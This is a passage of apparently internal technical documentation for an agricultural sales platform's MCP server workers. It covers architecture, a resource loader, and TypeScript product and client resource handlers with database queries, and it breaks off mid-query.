# Etapa 3 - Workers L: MCP Server Workers

# Cerniq B2B Agricultural Sales Automation Platform

# Model Context Protocol Implementation

**Document Version:** 1.0.0
**Created:** 2026-01-18
**Last Updated:** 2026-01-18
**Author:** Cerniq Development Team
**Status:** Complete Technical Specification

---

## Document Information

| Attribute | Value |
|-----------|-------|
| **Document ID** | CERNIQ-E3-WORKERS-L-001 |
| **Classification** | Internal - Technical Documentation |
| **Target Audience** | Developers, System Architects, DevOps |
| **Dependencies** | Etapa 3 Infrastructure, Workers A-K |

---

## Table of Contents

1. [Overview & Architecture](#1-overview--architecture)
2. [Worker L1: Resource Loader](#2-worker-l1-resource-loader)
3. [Worker L2: Tool Registry](#3-worker-l2-tool-registry)
4. [Worker L3: Session Manager](#4-worker-l3-session-manager)
5. [MCP Protocol Implementation](#5-mcp-protocol-implementation)
6. [Resource Types & Schemas](#6-resource-types--schemas)
7. [Tool Definitions & Execution](#7-tool-definitions--execution)
8. [Database Schema](#8-database-schema)
9. [Configuration & Deployment](#9-configuration--deployment)
10. [Monitoring & Observability](#10-monitoring--observability)
11. [Testing Strategy](#11-testing-strategy)
12. [Security & Compliance](#12-security--compliance)
13. [Changelog & References](#13-changelog--references)

---

## 1. Overview & Architecture

### 1.1 Introduction

Workers L implement the Model Context Protocol (MCP) Server for Cerniq's AI-powered sales automation platform. MCP provides a standardized way for LLM applications to access external data sources and tools, enabling seamless integration between the AI Agent (Workers C) and Cerniq's business resources.

The MCP Server exposes:

- **Resources**: Product catalogs, customer profiles, conversation history, pricing data
- **Tools**: Business operations like order placement, quote generation, inventory checks
- **Prompts**: Pre-defined conversation templates for common scenarios

### 1.2 MCP Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           CERNIQ MCP ARCHITECTURE                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                         MCP HOST (AI Agent)                          │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                  │   │
│  │  │   Claude    │  │  Context    │  │  Response   │                  │   │
│  │  │   Sonnet    │◄─┤  Manager    │◄─┤  Generator  │                  │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘                  │   │
│  │         │                                  ▲                         │   │
│  │         ▼                                  │                         │   │
│  │  ┌─────────────────────────────────────────┴──────────────────────┐ │   │
│  │  │                      MCP CLIENT                                 │ │   │
│  │  │  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐   │ │   │
│  │  │  │ Resource  │  │   Tool    │  │  Prompt   │  │  Session  │   │ │   │
│  │  │  │ Requester │  │  Invoker  │  │  Fetcher  │  │  Handler  │   │ │   │
│  │  │  └───────────┘  └───────────┘  └───────────┘  └───────────┘   │ │   │
│  │  └─────────────────────────────────────────────────────────────────┘ │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    │ JSON-RPC 2.0                           │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                         MCP SERVER (Workers L)                       │   │
│  │  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐     │   │
│  │  │   Worker L1     │  │   Worker L2     │  │   Worker L3     │     │   │
│  │  │ Resource Loader │  │ Tool Registry   │  │ Session Manager │     │   │
│  │  └────────┬────────┘  └────────┬────────┘  └────────┬────────┘     │   │
│  │           │                    │                    │               │   │
│  │           ▼                    ▼                    ▼               │   │
│  │  ┌────────────────────────────────────────────────────────────┐    │   │
│  │  │                   CAPABILITY LAYER                          │    │   │
│  │  │  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌─────────┐ │    │   │
│  │  │  │ Resources │  │   Tools   │  │  Prompts  │  │ Logging │ │    │   │
│  │  │  └───────────┘  └───────────┘  └───────────┘  └─────────┘ │    │   │
│  │  └────────────────────────────────────────────────────────────┘    │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                        DATA SOURCES                                  │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐  │   │
│  │  │Products │  │Customers│  │ Orders  │  │ Pricing │  │ History │  │   │
│  │  │   DB    │  │   DB    │  │   DB    │  │ Engine  │  │  Cache  │  │   │
│  │  └─────────┘  └─────────┘  └─────────┘  └─────────┘  └─────────┘  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 1.3 Worker Summary

| Worker | Queue Name | Purpose | Concurrency | Timeout |
|--------|------------|---------|-------------|---------|
| **L1** | `mcp:resource:load` | Load resources for LLM context | 100 | 5000ms |
| **L2** | `mcp:tool:register` | Register and manage tools | 5 | 10000ms |
| **L3** | `mcp:session:manage` | Manage MCP sessions per lead | 50 | 3000ms |

### 1.4 Technology Stack

```typescript
// technology-stack.ts
// MCP Server Technology Stack

export const MCP_TECHNOLOGY_STACK = {
  // Core Protocol
  protocol: {
    name: 'Model Context Protocol',
    version: '2025-11-25',
    transport: 'JSON-RPC 2.0',
    specification: 'https://modelcontextprotocol.io/specification'
  },
  
  // Server Implementation
  server: {
    runtime: 'Node.js v24.12.0 LTS',
    framework: 'Fastify v5.6.2',
    language: 'TypeScript 5.7.2',
    sdk: '@modelcontextprotocol/sdk ^1.12.0'
  },
  
  // Queue Processing
  queue: {
    manager: 'BullMQ v5.66.5',
    broker: 'Redis 8.4.0',
    persistence: true
  },
  
  // Database
  database: {
    primary: 'PostgreSQL 18.1',
    orm: 'Drizzle ORM v0.38.4',
    cache: 'Redis 8.4.0'
  },
  
  // Validation
  validation: {
    schema: 'Zod v3.24.1',
    jsonSchema: 'JSON Schema Draft 2020-12'
  },
  
  // Security
  security: {
    auth: 'OAuth 2.1',
    encryption: 'AES-256-GCM',
    signing: 'Ed25519'
  }
};
```

### 1.5 MCP Protocol Compliance

```typescript
// mcp-compliance.ts
// MCP Protocol Compliance Checklist

export const MCP_COMPLIANCE = {
  // Protocol Version
  protocolVersion: '2025-11-25',
  
  // Required Capabilities
  requiredCapabilities: {
    resources: {
      subscribe: true,
      listChanged: true
    },
    tools: {
      listChanged: true
    },
    prompts: {
      listChanged: true
    },
    logging: {
      supported: true
    }
  },
  
  // Message Types Supported
  messageTypes: {
    // Requests
    requests: [
      'initialize',
      'ping',
      'resources/list',
      'resources/read',
      'resources/subscribe',
      'resources/unsubscribe',
      'tools/list',
      'tools/call',
      'prompts/list',
      'prompts/get',
      'logging/setLevel',
      'completion/complete'
    ],
    
    // Notifications
    notifications: [
      'initialized',
      'cancelled',
      'progress',
      'resources/updated',
      'resources/list_changed',
      'tools/list_changed',
      'prompts/list_changed',
      'logging/message'
    ]
  },
  
  // Security Requirements (June 2025 Update)
  security: {
    oauthResourceServer: true,        // MCP server as OAuth Resource Server
    resourceIndicators: true,          // RFC 8707 compliance
    tokenValidation: true,             // Access token validation
    scopeEnforcement: true             // OAuth scope enforcement
  },
  
  // Error Handling
  errorCodes: {
    parseError: -32700,
    invalidRequest: -32600,
    methodNotFound: -32601,
    invalidParams: -32602,
    internalError: -32603,
    // MCP-specific errors
    resourceNotFound: -32001,
    toolExecutionError: -32002,
    sessionNotFound: -32003,
    authorizationError: -32004
  }
};
```

---

## 2. Worker L1: Resource Loader

### 2.1 Overview

Worker L1 (Resource Loader) is responsible for loading and serving MCP resources to the AI Agent. Resources are contextual data that the LLM needs to generate informed responses, including product catalogs, customer profiles, conversation history, and pricing data.

```typescript
// l1-resource-loader.ts
// Worker L1: MCP Resource Loader

import { Worker, Job, Queue } from 'bullmq';
import { db } from '@cerniq/database';
import { redis } from '@cerniq/redis';
import { 
  MCPResource, 
  ResourceType, 
  ResourceLoadResult,
  ResourceUri 
} from '@cerniq/mcp/types';
import { logger } from '@cerniq/observability';
import { z } from 'zod';
import { nanoid } from 'nanoid';

// Resource Load Job Schema
const ResourceLoadJobSchema = z.object({
  tenantId: z.string().uuid(),
  sessionId: z.string(),
  resourceUri: z.string(),
  resourceType: z.enum(['product', 'client', 'conversation', 'catalog', 'pricing', 'inventory']),
  options: z.object({
    maxTokens: z.number().optional().default(4000),
    includeMetadata: z.boolean().optional().default(true),
    cacheTtl: z.number().optional().default(3600),
    priorityLevel: z.enum(['low', 'normal', 'high', 'critical']).optional().default('normal')
  }).optional()
});

type ResourceLoadJobData = z.infer<typeof ResourceLoadJobSchema>;

// Resource Loader Configuration
const RESOURCE_CONFIG = {
  queue: {
    name: 'mcp:resource:load',
    concurrency: 100,
    maxRetries: 3,
    timeout: 5000
  },
  cache: {
    prefix: 'mcp:resource:',
    defaultTtl: 3600,  // 1 hour
    maxSize: 10000
  },
  tokens: {
    maxPerResource: 8000,
    targetCompression: 0.7
  }
};

/**
 * Worker L1: Resource Loader
 * Loads MCP resources for AI Agent context
 */
export class ResourceLoaderWorker {
  private worker: Worker;
  private queue: Queue;
  private resourceHandlers: Map<ResourceType, ResourceHandler>;
  
  constructor() {
    this.queue = new Queue(RESOURCE_CONFIG.queue.name, {
      connection: redis,
      defaultJobOptions: {
        attempts: RESOURCE_CONFIG.queue.maxRetries,
        backoff: { type: 'exponential', delay: 1000 },
        removeOnComplete: { age: 3600 },
        removeOnFail: { age: 86400 }
      }
    });
    
    this.resourceHandlers = new Map();
    this.initializeHandlers();
  }
  
  /**
   * Initialize resource handlers for each type
   */
  private initializeHandlers(): void {
    this.resourceHandlers.set('product', new ProductResourceHandler());
    this.resourceHandlers.set('client', new ClientResourceHandler());
    this.resourceHandlers.set('conversation', new ConversationResourceHandler());
    this.resourceHandlers.set('catalog', new CatalogResourceHandler());
    this.resourceHandlers.set('pricing', new PricingResourceHandler());
    this.resourceHandlers.set('inventory', new InventoryResourceHandler());
  }
  
  /**
   * Start the worker
   */
  async start(): Promise<void> {
    this.worker = new Worker(
      RESOURCE_CONFIG.queue.name,
      async (job: Job<ResourceLoadJobData>) => this.processJob(job),
      {
        connection: redis,
        concurrency: RESOURCE_CONFIG.queue.concurrency,
        limiter: {
          max: 1000,
          duration: 60000  // 1000 requests per minute
        }
      }
    );
    
    this.setupEventHandlers();
    
    logger.info('Worker L1 (Resource Loader) started', {
      queue: RESOURCE_CONFIG.queue.name,
      concurrency: RESOURCE_CONFIG.queue.concurrency
    });
  }
  
  /**
   * Process resource load job
   */
  private async processJob(job: Job<ResourceLoadJobData>): Promise<ResourceLoadResult> {
    const startTime = Date.now();
    const { tenantId, sessionId, resourceUri, resourceType, options } = job.data;
    
    try {
      // Validate input
      ResourceLoadJobSchema.parse(job.data);
      
      // Check cache first
      const cached = await this.checkCache(tenantId, resourceUri);
      if (cached) {
        logger.debug('Resource loaded from cache', { resourceUri, sessionId });
        return {
          ...cached,
          cachedFrom: 'redis',
          loadTime: Date.now() - startTime
        };
      }
      
      // Get appropriate handler
      const handler = this.resourceHandlers.get(resourceType);
      if (!handler) {
        throw new Error(`Unknown resource type: ${resourceType}`);
      }
      
      // Parse resource URI
      const parsedUri = this.parseResourceUri(resourceUri);
      
      // Load resource
      const resource = await handler.load(tenantId, parsedUri, options || {});
      
      // Compress if needed
      const compressedResource = await this.compressResource(resource, options?.maxTokens || 4000);
      
      // Cache result
      await this.cacheResource(tenantId, resourceUri, compressedResource, options?.cacheTtl || 3600);
      
      // Build result
      const result: ResourceLoadResult = {
        uri: resourceUri,
        resourceType,
        content: compressedResource.content,
        tokens: compressedResource.tokens,
        metadata: options?.includeMetadata ? compressedResource.metadata : undefined,
        loadTime: Date.now() - startTime
      };
      
      // Log metrics
      await this.recordMetrics(tenantId, resourceType, result.loadTime, result.tokens);
      
      logger.info('Resource loaded successfully', {
        resourceUri,
        resourceType,
        tokens: result.tokens,
        loadTime: result.loadTime,
        sessionId
      });
      
      return result;
      
    } catch (error) {
      logger.error('Resource load failed', {
        resourceUri,
        resourceType,
        error: error instanceof Error ? error.message : 'Unknown error',
        sessionId
      });
      throw error;
    }
  }
  
  /**
   * Parse MCP resource URI
   */
  private parseResourceUri(uri: string): ParsedResourceUri {
    // Format: cerniq://resource_type/tenant_id/resource_id[/subresource]
    // Example: cerniq://product/tenant123/prod_abc123
    // Example: cerniq://client/tenant123/client_xyz/history
    
    const regex = /^cerniq:\/\/(\w+)\/([^\/]+)\/([^\/]+)(?:\/(.+))?$/;
    const match = uri.match(regex);
    
    if (!match) {
      throw new Error(`Invalid resource URI: ${uri}`);
    }
    
    return {
      resourceType: match[1] as ResourceType,
      tenantId: match[2],
      resourceId: match[3],
      subresource: match[4]
    };
  }
  
  /**
   * Check cache for resource
   */
  private async checkCache(tenantId: string, uri: string): Promise<ResourceLoadResult | null> {
    const cacheKey = `${RESOURCE_CONFIG.cache.prefix}${tenantId}:${uri}`;
    const cached = await redis.get(cacheKey);
    
    if (cached) {
      return JSON.parse(cached);
    }
    
    return null;
  }
  
  /**
   * Cache loaded resource
   */
  private async cacheResource(
    tenantId: string,
    uri: string,
    resource: CompressedResource,
    ttl: number
  ): Promise<void> {
    const cacheKey = `${RESOURCE_CONFIG.cache.prefix}${tenantId}:${uri}`;
    await redis.setex(cacheKey, ttl, JSON.stringify(resource));
  }
  
  /**
   * Compress resource to fit token limit
   */
  private async compressResource(
    resource: MCPResource,
    maxTokens: number
  ): Promise<CompressedResource> {
    // Estimate current tokens
    const currentTokens = this.estimateTokens(resource.content);
    
    if (currentTokens <= maxTokens) {
      return {
        content: resource.content,
        tokens: currentTokens,
        metadata: resource.metadata,
        compressed: false
      };
    }
    
    // Apply compression strategies
    let compressedContent = resource.content;
    
    // Strategy 1: Remove whitespace and formatting
    compressedContent = this.removeExcessWhitespace(compressedContent);
    
    // Strategy 2: Summarize if still too large
    if (this.estimateTokens(compressedContent) > maxTokens) {
      compressedContent = await this.summarizeContent(compressedContent, maxTokens);
    }
    
    // Strategy 3: Truncate as last resort
    if (this.estimateTokens(compressedContent) > maxTokens) {
      compressedContent = this.truncateContent(compressedContent, maxTokens);
    }
    
    return {
      content: compressedContent,
      tokens: this.estimateTokens(compressedContent),
      metadata: resource.metadata,
      compressed: true
    };
  }
  
  /**
   * Estimate token count for content
   */
  private estimateTokens(content: any): number {
    const text = typeof content === 'string' ? content : JSON.stringify(content);
    // Rough estimation: 1 token ≈ 4 characters for English/Romanian
    return Math.ceil(text.length / 4);
  }
  
  /**
   * Remove excess whitespace
   */
  private removeExcessWhitespace(content: any): any {
    if (typeof content === 'string') {
      return content.replace(/\s+/g, ' ').trim();
    }
    return content;
  }
  
  /**
   * Summarize content using AI
   */
  private async summarizeContent(content: any, maxTokens: number): Promise<any> {
    // For complex objects, select most relevant fields
    if (typeof content === 'object' && content !== null) {
      return this.selectRelevantFields(content, maxTokens);
    }
    
    // For text, truncate intelligently
    return content;
  }
  
  /**
   * Select most relevant fields from object
   */
  private selectRelevantFields(obj: any, maxTokens: number): any {
    const priorityFields = [
      'id', 'name', 'title', 'description', 'price', 'quantity',
      'status', 'category', 'type', 'email', 'phone', 'cui'
    ];
    
    const result: any = {};
    let currentTokens = 0;
    
    // Add priority fields first
    for (const field of priorityFields) {
      if (obj[field] !== undefined) {
        const fieldValue = obj[field];
        const fieldTokens = this.estimateTokens(fieldValue);
        
        if (currentTokens + fieldTokens <= maxTokens * 0.8) {
          result[field] = fieldValue;
          currentTokens += fieldTokens;
        }
      }
    }
    
    // Add remaining fields if space
    for (const [key, value] of Object.entries(obj)) {
      if (!priorityFields.includes(key) && result[key] === undefined) {
        const fieldTokens = this.estimateTokens(value);
        
        if (currentTokens + fieldTokens <= maxTokens) {
          result[key] = value;
          currentTokens += fieldTokens;
        }
      }
    }
    
    return result;
  }
  
  /**
   * Truncate content to fit token limit
   */
  private truncateContent(content: any, maxTokens: number): any {
    if (typeof content === 'string') {
      const maxChars = maxTokens * 4;
      return content.slice(0, maxChars) + '... [truncated]';
    }
    
    if (Array.isArray(content)) {
      const result = [];
      let currentTokens = 0;
      
      for (const item of content) {
        const itemTokens = this.estimateTokens(item);
        if (currentTokens + itemTokens <= maxTokens) {
          result.push(item);
          currentTokens += itemTokens;
        } else {
          break;
        }
      }
      
      return result;
    }
    
    return content;
  }
  
  /**
   * Record metrics for monitoring
   */
  private async recordMetrics(
    tenantId: string,
    resourceType: string,
    loadTime: number,
    tokens: number
  ): Promise<void> {
    const metrics = {
      tenantId,
      resourceType,
      loadTime,
      tokens,
      timestamp: Date.now()
    };
    
    // Push to Redis stream for monitoring
    await redis.xadd(
      'metrics:mcp:resources',
      '*',
      'data', JSON.stringify(metrics)
    );
  }
  
  /**
   * Setup event handlers
   */
  private setupEventHandlers(): void {
    this.worker.on('completed', (job) => {
      logger.debug('Resource load job completed', { jobId: job.id });
    });
    
    this.worker.on('failed', (job, error) => {
      logger.error('Resource load job failed', {
        jobId: job?.id,
        error: error.message
      });
    });
    
    this.worker.on('stalled', (jobId) => {
      logger.warn('Resource load job stalled', { jobId });
    });
  }
  
  /**
   * Stop the worker
   */
  async stop(): Promise<void> {
    await this.worker.close();
    await this.queue.close();
    logger.info('Worker L1 (Resource Loader) stopped');
  }
}

// Type definitions
interface ParsedResourceUri {
  resourceType: ResourceType;
  tenantId: string;
  resourceId: string;
  subresource?: string;
}

interface CompressedResource {
  content: any;
  tokens: number;
  metadata?: Record<string, any>;
  compressed: boolean;
}

interface ResourceHandler {
  load(tenantId: string, uri: ParsedResourceUri, options: any): Promise<MCPResource>;
}
```

### 2.2 Product Resource Handler

```typescript
// handlers/product-resource-handler.ts
// Product Resource Handler for MCP

import { db } from '@cerniq/database';
import { 
  products, 
  productCategories, 
  productPricing,
  productInventory 
} from '@cerniq/database/schema';
import { eq, and, ilike } from 'drizzle-orm';
import { MCPResource, ParsedResourceUri } from '@cerniq/mcp/types';

export class ProductResourceHandler implements ResourceHandler {
  
  /**
   * Load product resource
   */
  async load(
    tenantId: string,
    uri: ParsedResourceUri,
    options: ResourceLoadOptions
  ): Promise<MCPResource> {
    const { resourceId, subresource } = uri;
    
    // Handle different subresources
    switch (subresource) {
      case 'pricing':
        return this.loadProductPricing(tenantId, resourceId, options);
      case 'inventory':
        return this.loadProductInventory(tenantId, resourceId, options);
      case 'category':
        return this.loadProductCategory(tenantId, resourceId, options);
      case 'related':
        return this.loadRelatedProducts(tenantId, resourceId, options);
      default:
        return this.loadFullProduct(tenantId, resourceId, options);
    }
  }
  
  /**
   * Load full product information
   */
  private async loadFullProduct(
    tenantId: string,
    productId: string,
    options: ResourceLoadOptions
  ): Promise<MCPResource> {
    const product = await db.query.products.findFirst({
      where: and(
        eq(products.tenantId, tenantId),
        eq(products.id, productId)
      ),
      with: {
        category: true,
        pricing: {
          orderBy: (pricing, { desc }) => [desc(pricing.effectiveFrom)],
          limit: 1
        },
        inventory: true,
        specifications: true
      }
    });
    
    if (!product) {
      throw new Error(`Product not found: ${productId}`);
    }
    
    // Format for LLM consumption
    const content = this.formatProductForLLM(product);
    
    return {
      uri: `cerniq://product/${tenantId}/${productId}`,
      name: product.name,
      description: product.description || `Produs: ${product.name}`,
      mimeType: 'application/json',
      content,
      metadata: {
        productId: product.id,
        sku: product.sku,
        category: product.category?.name,
        lastUpdated: product.updatedAt
      }
    };
  }
  
  /**
   * Format product for LLM consumption
   */
  private formatProductForLLM(product: any): ProductLLMFormat {
    return {
      // Identity
      id: product.id,
      sku: product.sku,
      name: product.name,
      nameRo: product.nameRo || product.name,
      
      // Description
      description: product.description,
      descriptionRo: product.descriptionRo || product.description,
      shortDescription: product.shortDescription,
      
      // Classification
      category: product.category?.name,
      subcategory: product.subcategory,
      brand: product.brand,
      manufacturer: product.manufacturer,
      
      // Pricing (current)
      pricing: product.pricing?.[0] ? {
        basePrice: product.pricing[0].basePrice,
        currency: product.pricing[0].currency || 'RON',
        vat: product.pricing[0].vatRate || 19,
        minOrderQuantity: product.pricing[0].minOrderQuantity,
        bulkDiscounts: product.pricing[0].bulkDiscounts
      } : null,
      
      // Stock
      stock: product.inventory ? {
        available: product.inventory.quantityAvailable,
        reserved: product.inventory.quantityReserved,
        incoming: product.inventory.quantityIncoming,
        location: product.inventory.warehouseLocation
      } : null,
      
      // Specifications
      specifications: product.specifications?.map((spec: any) => ({
        name: spec.name,
        value: spec.value,
        unit: spec.unit
      })) || [],
      
      // Agricultural specifics
      agricultural: {
        cropTypes: product.cropTypes,
        applicationMethod: product.applicationMethod,
        dosage: product.dosage,
        seasonality: product.seasonality,
        certifications: product.certifications
      },
      
      // Status
      status: product.status,
      isActive: product.isActive,
      availableFrom: product.availableFrom,
      availableUntil: product.availableUntil
    };
  }
  
  /**
   * Load product pricing details
   */
  private async loadProductPricing(
    tenantId: string,
    productId: string,
    options: ResourceLoadOptions
  ): Promise<MCPResource> {
    const pricing = await db.query.productPricing.findMany({
      where: and(
        eq(productPricing.tenantId, tenantId),
        eq(productPricing.productId, productId)
      ),
      orderBy: (p, { desc }) => [desc(p.effectiveFrom)]
    });
    
    const product = await db.query.products.findFirst({
      where: and(
        eq(products.tenantId, tenantId),
        eq(products.id, productId)
      ),
      columns: { id: true, name: true, sku: true }
    });
    
    return {
      uri: `cerniq://product/${tenantId}/${productId}/pricing`,
      name: `Pricing for ${product?.name || productId}`,
      description: 'Product pricing history and current prices',
      mimeType: 'application/json',
      content: {
        productId,
        productName: product?.name,
        sku: product?.sku,
        currentPrice: pricing[0],
        priceHistory: pricing.slice(1, 5),
        bulkDiscounts: pricing[0]?.bulkDiscounts || [],
        volumeTiers: pricing[0]?.volumeTiers || []
      },
      metadata: {
        priceCount: pricing.length,
        lastUpdate: pricing[0]?.updatedAt
      }
    };
  }
  
  /**
   * Load product inventory
   */
  private async loadProductInventory(
    tenantId: string,
    productId: string,
    options: ResourceLoadOptions
  ): Promise<MCPResource> {
    const inventory = await db.query.productInventory.findFirst({
      where: and(
        eq(productInventory.tenantId, tenantId),
        eq(productInventory.productId, productId)
      )
    });
    
    const product = await db.query.products.findFirst({
      where: and(
        eq(products.tenantId, tenantId),
        eq(products.id, productId)
      ),
      columns: { id: true, name: true, sku: true }
    });
    
    return {
      uri: `cerniq://product/${tenantId}/${productId}/inventory`,
      name: `Inventory for ${product?.name || productId}`,
      description: 'Product stock and availability information',
      mimeType: 'application/json',
      content: {
        productId,
        productName: product?.name,
        sku: product?.sku,
        availability: {
          available: inventory?.quantityAvailable || 0,
          reserved: inventory?.quantityReserved || 0,
          incoming: inventory?.quantityIncoming || 0,
          backorder: inventory?.quantityBackorder || 0
        },
        warehouse: {
          location: inventory?.warehouseLocation,
          zone: inventory?.warehouseZone,
          bin: inventory?.binLocation
        },
        reorderInfo: {
          reorderPoint: inventory?.reorderPoint,
          reorderQuantity: inventory?.reorderQuantity,
          leadTimeDays: inventory?.leadTimeDays
        },
        lastStockCheck: inventory?.lastStockCheckAt
      },
      metadata: {
        lastUpdate: inventory?.updatedAt
      }
    };
  }
  
  /**
   * Load related products
   */
  private async loadRelatedProducts(
    tenantId: string,
    productId: string,
    options: ResourceLoadOptions
  ): Promise<MCPResource> {
    // Get product category for finding related products
    const product = await db.query.products.findFirst({
      where: and(
        eq(products.tenantId, tenantId),
        eq(products.id, productId)
      )
    });
    
    if (!product) {
      throw new Error(`Product not found: ${productId}`);
    }
    
    // Find related products in same category
    const related = await db.query.products.findMany({
      where: and(
        eq(products.tenantId, tenantId),
        eq(products.categoryId, product.categoryId),
        eq(products.isActive, true)
      ),
      limit: 10,
      columns: {
        id: true,
        name: true,
        sku: true,
        description: true
      },
      with: {
        pricing: {
          orderBy: (p, { desc }) => [desc(p.effectiveFrom)],
          limit: 1,
          columns: { basePrice: true, currency: true }
        }
      }
    });
    
    // Filter out the original product
    const filteredRelated = related.filter(p => p.id !== productId);
    
    return {
      uri: `cerniq://product/${tenantId}/${productId}/related`,
      name: `Related products for ${product.name}`,
      description: 'Products in the same category that might be of interest',
      mimeType: 'application/json',
      content: {
        productId,
        productName: product.name,
        category: product.categoryId,
        relatedProducts: filteredRelated.map(p => ({
          id: p.id,
          name: p.name,
          sku: p.sku,
          description: p.description?.slice(0, 200),
          price: p.pricing?.[0]?.basePrice,
          currency: p.pricing?.[0]?.currency || 'RON'
        }))
      },
      metadata: {
        relatedCount: filteredRelated.length
      }
    };
  }
  
  /**
   * Load product category
   */
  private async loadProductCategory(
    tenantId: string,
    categoryId: string,
    options: ResourceLoadOptions
  ): Promise<MCPResource> {
    const category = await db.query.productCategories.findFirst({
      where: and(
        eq(productCategories.tenantId, tenantId),
        eq(productCategories.id, categoryId)
      ),
      with: {
        products: {
          where: eq(products.isActive, true),
          limit: 20,
          columns: { id: true, name: true, sku: true },
          with: {
            pricing: {
              orderBy: (p, { desc }) => [desc(p.effectiveFrom)],
              limit: 1,
              columns: { basePrice: true }
            }
          }
        }
      }
    });
    
    if (!category) {
      throw new Error(`Category not found: ${categoryId}`);
    }
    
    return {
      uri: `cerniq://product/${tenantId}/category/${categoryId}`,
      name: `Category: ${category.name}`,
      description: category.description || `Products in ${category.name}`,
      mimeType: 'application/json',
      content: {
        categoryId: category.id,
        name: category.name,
        description: category.description,
        productCount: category.products.length,
        products: category.products.map(p => ({
          id: p.id,
          name: p.name,
          sku: p.sku,
          price: p.pricing?.[0]?.basePrice
        }))
      },
      metadata: {
        productCount: category.products.length
      }
    };
  }
}

// Type definitions
interface ResourceLoadOptions {
  maxTokens?: number;
  includeMetadata?: boolean;
  cacheTtl?: number;
}

interface ProductLLMFormat {
  id: string;
  sku: string;
  name: string;
  nameRo: string;
  description: string | null;
  descriptionRo: string | null;
  shortDescription: string | null;
  category: string | null;
  subcategory: string | null;
  brand: string | null;
  manufacturer: string | null;
  pricing: {
    basePrice: number;
    currency: string;
    vat: number;
    minOrderQuantity: number | null;
    bulkDiscounts: any[];
  } | null;
  stock: {
    available: number;
    reserved: number;
    incoming: number;
    location: string | null;
  } | null;
  specifications: Array<{ name: string; value: string; unit: string | null }>;
  agricultural: {
    cropTypes: string[] | null;
    applicationMethod: string | null;
    dosage: string | null;
    seasonality: string | null;
    certifications: string[] | null;
  };
  status: string;
  isActive: boolean;
  availableFrom: Date | null;
  availableUntil: Date | null;
}
```

### 2.3 Client Resource Handler

```typescript
// src/workers/mcp/resources/client-resource-handler.ts

import { MCP_RESOURCE_TYPES, MCPResourceMetadata } from '../types';
import { pool } from '@cerniq/database';
import { logger } from '@cerniq/logger';
import { createHash } from 'crypto';

interface ClientLLMFormat {
  id: string;
  tenantId: string;
  cui: string;
  companyName: string;
  tradeName: string | null;
  status: string;
  tier: 'bronze' | 'silver' | 'gold';
  
  // Contact Information
  contact: {
    email: string | null;
    phone: string | null;
    website: string | null;
    contactPerson: string | null;
    position: string | null;
  };
  
  // Address
  address: {
    county: string | null;
    city: string | null;
    street: string | null;
    postalCode: string | null;
    formatted: string | null;
  };
  
  // Business Details
  business: {
    caenCode: string | null;
    caenDescription: string | null;
    isAgriculture: boolean;
    registrationDate: Date | null;
    employees: number | null;
    capital: number | null;
    vatPayer: boolean;
  };
  
  // Financial Summary
  financials: {
    lastTurnover: number | null;
    lastProfit: number | null;
    lastYear: number | null;
    paymentScore: number | null;
    creditLimit: number | null;
  };
  
  // Relationship
  relationship: {
    acquisitionDate: Date | null;
    lastOrderDate: Date | null;
    totalOrders: number;
    totalRevenue: number;
    averageOrderValue: number | null;
    preferredPaymentTerms: string | null;
    notes: string | null;
  };
  
  // Engagement
  engagement: {
    lastContactDate: Date | null;
    lastEmailDate: Date | null;
    emailOpenRate: number | null;
    responseRate: number | null;
    engagementScore: number | null;
  };
  
  // Tags & Segments
  tags: string[];
  segments: string[];
}

interface ClientLoadOptions {
  includeOrders?: boolean;
  includeConversations?: boolean;
  includeFinancials?: boolean;
  ordersLimit?: number;
  conversationsLimit?: number;
  maxTokens?: number;
}

export class ClientResourceHandler {
  private readonly resourceType = 'client' as const;
  
  /**
   * Load client resource by ID
   */
  async loadById(
    tenantId: string,
    clientId: string,
    options: ClientLoadOptions = {}
  ): Promise<{ content: ClientLLMFormat; metadata: MCPResourceMetadata }> {
    const startTime = Date.now();
    
    try {
      const client = await pool.query(`
        SELECT 
          c.*,
          -- Contact info from bronze/silver
          COALESCE(s.email, b.email) as contact_email,
          COALESCE(s.phone, b.phone) as contact_phone,
          s.website,
          s.contact_person,
          s.contact_position,
          
          -- Address
          s.county,
          s.city,
          s.street,
          s.postal_code,
          
          -- Business details
          s.caen_code,
          s.caen_description,
          s.is_agriculture,
          s.registration_date,
          s.employees,
          s.capital,
          s.vat_payer,
          
          -- Financials
          f.turnover as last_turnover,
          f.profit as last_profit,
          f.year as last_financial_year,
          g.payment_score,
          g.credit_limit,
          
          -- Relationship stats
          g.acquisition_date,
          g.last_order_date,
          g.total_orders,
          g.total_revenue,
          g.average_order_value,
          g.preferred_payment_terms,
          g.notes,
          
          -- Engagement
          e.last_contact_date,
          e.last_email_date,
          e.email_open_rate,
          e.response_rate,
          e.engagement_score
          
        FROM contacts_gold g
        JOIN contacts_silver s ON s.id = g.silver_id
        JOIN contacts_bronze b ON b.id = s.bronze_id
        LEFT JOIN contact_financials f ON f.contact_id = g.id 
          AND f.year = (SELECT MAX(year) FROM contact_financials WHERE contact_id = g.id)
        LEFT JOIN contact_engagement e ON e.contact_id = g.id
        WHERE g.id = $1 AND g.tenant_id = $2
      `, [clientId, tenantId]);
      
      if (client.rows.length === 0) {
        throw new Error(`Client not found: ${clientId}`);
      }
      
      const row = client.rows[0];
      
      // Load tags
      const tagsResult = await pool.query(`
        SELECT t.name
        FROM contact_tags ct
        JOIN tags t ON t.id = ct.tag_id
        WHERE ct.contact_id = $1 AND ct.tenant_id = $2
      `, [clientId, tenantId]);
      
      // Load segments
      const segmentsResult = await pool.query(`
        SELECT s.name
        FROM contact_segments cs
